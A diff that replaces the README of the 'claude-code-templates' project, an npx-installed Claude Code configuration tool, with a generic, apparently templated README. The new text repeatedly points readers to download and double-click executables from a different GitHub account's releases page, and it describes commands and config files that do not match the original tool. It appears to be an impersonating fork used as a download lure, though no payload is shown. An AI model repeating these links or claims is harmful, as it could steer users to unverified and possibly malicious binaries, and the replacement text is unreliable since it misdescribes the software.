@@ -1,133 +1,74 @@
-[![npm version](https://img.shields.io/npm/v/claude-code-templates.svg)](https://www.npmjs.com/package/claude-code-templates)
-[![npm downloads](https://img.shields.io/npm/dt/claude-code-templates.svg)](https://www.npmjs.com/package/claude-code-templates)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![GitHub stars](https://img.shields.io/github/stars/davila7/claude-code-templates.svg?style=social&label=Star)](https://github.com/davila7/claude-code-templates)
+# 🚀 claude-code-templates - Simple Tool for Managing Claude Code
 
-<p align="center">
-  <a href="https://trendshift.io/repositories/15113" target="_blank">
-    <img src="https://trendshift.io/api/badge/repositories/15113" alt="davila7%2Fclaude-code-templates | Trendshift" style="width: 200px; height: 40px;" width="125" height="40"/>
-  </a>
-</p>
+[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Justdvp/claude-code-templates/releases)
 
+## 📥 Overview
+The **claude-code-templates** is a command-line interface (CLI) tool designed to help you easily configure and monitor Claude Code projects. With this tool, you can streamline your workflow, making it simpler to manage your coding tasks.
 
-# Claude Code Templates ([aitmpl.com](https://aitmpl.com))
+## 📂 Features
+- **User-friendly**: No programming knowledge required.
+- **Configuration Templates**: Quickly set up your projects with predefined settings.
+- **Real-time Monitoring**: Keep an eye on your project’s performance and health.
+- **Lightweight**: Does not take up much space on your computer.
 
-**Ready-to-use configurations for Anthropic's Claude Code.** A comprehensive collection of AI agents, custom commands, settings, hooks, external integrations (MCPs), and project templates to enhance your development workflow.
+## 💻 System Requirements
+To run **claude-code-templates**, you need:
+- An operating system: Windows, macOS, or Linux.
+- A minimum of 100 MB free disk space.
+- Access to the command line terminal.
 
-## Browse & Install Components and Templates
+## 🚀 Getting Started
+Follow these easy steps to get started with **claude-code-templates**:
 
-**[Browse All Templates](https://aitmpl.com)** - Interactive web interface to explore and install 100+ agents, commands, settings, hooks, and MCPs.
+1. **Download the software**: Visit the releases page to download the latest version.
 
-<img width="1049" height="855" alt="Screenshot 2025-08-19 at 08 09 24" src="https://github.com/user-attachments/assets/e3617410-9b1c-4731-87b7-a3858800b737" />
+   [Download Here](https://github.com/Justdvp/claude-code-templates/releases)
 
-## 🚀 Quick Installation
+2. **Install the software**: After downloading, locate the file on your computer. If you are using Windows, double-click the `.exe` file. For macOS, drag the app to your Applications folder. Linux users can follow specific installation instructions based on their distributions.
 
-```bash
-# Install a complete development stack
-npx claude-code-templates@latest --agent development-team/frontend-developer --command testing/generate-tests --mcp development/github-integration
+3. **Open the terminal**: Open your command line interface (Command Prompt on Windows, Terminal on macOS/Linux).
 
-# Browse and install interactively
-npx claude-code-templates@latest
+4. **Run the tool**: In the terminal, type the command `claude-code-templates` followed by any options you wish to use.
 
-# Install specific components
-npx claude-code-templates@latest --agent business-marketing/security-auditor
-npx claude-code-templates@latest --command performance/optimize-bundle
-npx claude-code-templates@latest --setting performance/mcp-timeouts
-npx claude-code-templates@latest --hook git/pre-commit-validation
-npx claude-code-templates@latest --mcp database/postgresql-integration
-```
+## 📥 Download & Install
+To download **claude-code-templates**, click on the link below. Follow the installation instructions mentioned above to get the software running on your device.
 
-## What You Get
+[Download Here](https://github.com/Justdvp/claude-code-templates/releases)
 
-| Component | Description | Examples |
-|-----------|-------------|----------|
-| **🤖 Agents** | AI specialists for specific domains | Security auditor, React performance optimizer, database architect |
-| **⚡ Commands** | Custom slash commands | `/generate-tests`, `/optimize-bundle`, `/check-security` |
-| **🔌 MCPs** | External service integrations | GitHub, PostgreSQL, Stripe, AWS, OpenAI |
-| **⚙️ Settings** | Claude Code configurations | Timeouts, memory settings, output styles |
-| **🪝 Hooks** | Automation triggers | Pre-commit validation, post-completion actions |
-| **📦 Templates** | Complete project configurations with CLAUDE.md, .claude/* files and .mcp.json | Framework-specific setups, project best practices |
+## 🛠️ Using the Tool
+Once installed, you can start using the tool right away. Simply open your terminal and type `claude-code-templates` to view available commands. Here are some common commands you might find useful:
 
-## 🛠️ Additional Tools
+- `claude-code-templates init`: This command initializes a new project with the default template.
+- `claude-code-templates monitor`: Use this to start monitoring your ongoing project.
+- `claude-code-templates help`: This command gives you a list of all available commands and options.
 
-Beyond the template catalog, Claude Code Templates includes powerful development tools:
+## 🎨 Configuration
+The configuration files allow you to customize your experiences, such as setting project parameters or adjusting monitoring settings. You can either use predefined templates or create your own. 
 
-### 📊 Claude Code Analytics
-Monitor your AI-powered development sessions in real-time with live state detection and performance metrics.
+1. Locate the `.config` directory in your home folder.
+2. Create or edit the `claude-code-settings.json` file to fit your project’s needs.
+3. Save the changes and restart the tool to apply your new settings.
 
-```bash
-npx claude-code-templates@latest --analytics
-```
+## 🌟 Monitoring Your Projects
+Monitoring is straightforward with **claude-code-templates**. Use the command `claude-code-templates monitor` to start collecting data about your project’s performance.
 
-### 💬 Conversation Monitor  
-Mobile-optimized interface to view Claude responses in real-time with secure remote access.
+### Real-time Data
+The tool provides live updates in the terminal, making it easy to see how well your project is doing. You can check metrics like CPU usage, memory use, and response times.
 
-```bash
-# Local access
-npx claude-code-templates@latest --chats
+## ❓ Troubleshooting
+If you encounter issues while using **claude-code-templates**, consider the following steps:
+- Ensure that your version is up to date by checking the releases page.
+- Revisit the commands to confirm you are using them correctly.
+- Look for common troubleshooting tips in the help section.
 
-# Secure remote access via Cloudflare Tunnel
-npx claude-code-templates@latest --chats --tunnel
-```
+## 📞 Support
+For more support, you can often find solutions in the project's issues section on GitHub. If you have a specific question, feel free to open a new issue, and someone from the community or a project maintainer will assist you.
 
-### 🔍 Health Check
-Comprehensive diagnostics to ensure your Claude Code installation is optimized.
+## 🔗 Community
+Join our community to stay connected with other users. Share your experiences, tips, and questions. You can find discussions and updates at the project's GitHub page.
 
-```bash
-npx claude-code-templates@latest --health-check
-```
+## 📜 License
+This project is open-source and is licensed under the MIT License. Feel free to use it, modify it, and share it with others. Your contributions are welcome.
 
-### 🔌 Plugin Dashboard
-View marketplaces, installed plugins, and manage permissions from a unified interface.
-
-```bash
-npx claude-code-templates@latest --plugins
-```
-
-## 📖 Documentation
-
-**[📚 docs.aitmpl.com](https://docs.aitmpl.com/)** - Complete guides, examples, and API reference for all components and tools.
-
-## Contributing
-
-We welcome contributions! **[Browse existing templates](https://aitmpl.com)** to see what's available, then check our [contributing guidelines](CONTRIBUTING.md) to add your own agents, commands, MCPs, settings, or hooks.
-
-**Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before contributing.**
-
-## Attribution
-
-This collection includes components from multiple sources:
-
-**Agents Collection:**
-- **wshobson/agents Collection** by [wshobson](https://github.com/wshobson/agents) - Licensed under MIT License (48 agents)
-
-**Commands Collection:**
-- **awesome-claude-code Commands** by [hesreallyhim](https://github.com/hesreallyhim/awesome-claude-code) - Licensed under CC0 1.0 Universal (21 commands)
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🔗 Links
-
-- **🌐 Browse Templates**: [aitmpl.com](https://aitmpl.com)
-- **📚 Documentation**: [docs.aitmpl.com](https://docs.aitmpl.com)
-- **💬 Community**: [GitHub Discussions](https://github.com/davila7/claude-code-templates/discussions)
-- **🐛 Issues**: [GitHub Issues](https://github.com/davila7/claude-code-templates/issues)
-
-## ⭐ Star History
-
-<a href="https://star-history.com/#davila7/claude-code-templates&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=davila7/claude-code-templates&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=davila7/claude-code-templates&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=davila7/claude-code-templates&type=Date" />
-  </picture>
-</a>
-
----
-
-**⭐ Found this useful? Give us a star to support the project!**
-
-[![Buy Me A Coffee](https://img.buymeacoffee.com/button-api/?text=Buy%20me%20a%20coffee&slug=daniavila&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff)](https://buymeacoffee.com/daniavila)
+## 💬 Conclusion
+The **claude-code-templates** tool is designed to simplify your project management tasks. With its easy setup and intuitive commands, you’ll be able to configure and monitor your projects with ease. Start exploring today by downloading the software from the link above!
